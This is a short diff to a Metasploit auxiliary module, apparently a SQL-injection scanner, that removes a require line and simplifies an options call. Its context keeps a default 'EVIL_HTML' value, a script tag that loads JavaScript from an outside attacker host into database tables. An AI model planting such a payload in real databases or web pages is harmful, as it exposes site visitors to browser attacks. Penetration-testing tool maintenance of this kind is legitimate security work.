@@ -4,8 +4,6 @@
 ##
 
 require 'rex/proto/http'
-require 'msf/core'
-
 
 
 class MetasploitModule < Msf::Auxiliary
@@ -34,7 +32,7 @@ class MetasploitModule < Msf::Auxiliary
         OptBool.new('TEXT_INT_INJECTION', [ true,  "Perform string injection", false]),
         OptBool.new('COMMENTED', [ true,  "Comment end of query", true]),
         OptString.new('EVIL_HTML', [ true,  "Evil HTML to add to tables", '<script src=http://browser-autopwn.com/evilscript.js></script>']),
-      ], self.class)
+      ])
 
   end
 
